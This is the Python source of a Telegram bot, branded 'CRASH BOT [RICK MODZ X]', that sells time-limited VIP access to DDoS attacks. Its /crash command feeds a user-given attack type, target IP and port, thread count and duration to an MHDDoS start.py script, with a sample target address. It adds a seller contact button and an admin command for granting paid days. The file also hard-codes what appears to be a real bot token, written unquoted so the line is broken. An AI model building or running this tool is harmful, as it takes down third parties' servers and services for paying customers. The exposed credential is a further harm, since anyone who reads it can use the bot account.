import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "TOKEN AQUI"
ADMIN_ID = 7178876305
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(8158271608:AAGxCV9Hm1tXJ1uAn9DJ-CvpO5d_47Y0yIY)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *Your VIP plan has expired.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ USER VIP!\n"
                f"⏳ Days remaining: {dias_restantes} dia(s)\n"
                f"📅 Expires in: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *You do not have an active VIP plan.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 SELLER - OFICIAL 💻",
        url=f"tg://user?id={6416239476}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "🤖 *WELCOME TO CRASH BOT [RICK MODZ X]!*"
            

            f"""
```
{vip_status}```\n"""
            "📌 *How to use:*"
            """
```
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "💡 *EXAMPLE:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n"""
            "💠 RICK MODZ USERS VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not an authorized seller .")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Invalid format. Use: `/vip <ID> <QUANTOS DIAS>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ USER {telegram_id} agregado como VIP por {days} dias.")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Your VIP access has expired")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ Wait 10 seconds before starting another attack and remember to stop the previous one..")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Invalid format!*\n\n"
                "📌 *Use correct:*\n"
                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                    "💡 *Example:*\n"
                "`/crash UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Stop Attack", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] ATTACK STARTED - 200 [✅]*\n\n"
            f"🌐 *ADDRESS:* {ip_port}\n"
            f"⚙️ *TYPE:* {attack_type}\n"
            f"🧟‍♀️ *THREADS:* {threads}\n"
            f"⏳ *TIME DURATION(ms):* {duration}\n\n"
            f"💠 RICK MODZX USERS VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Only the user who started the attack can stop it."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅Attack successfully sent")
        bot.edit_message_text(
            "*[⛔] ATTACK FINISHED[⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ No attack found, continue with your action.")

if __name__ == "__main__":
    bot.infinity_polling()
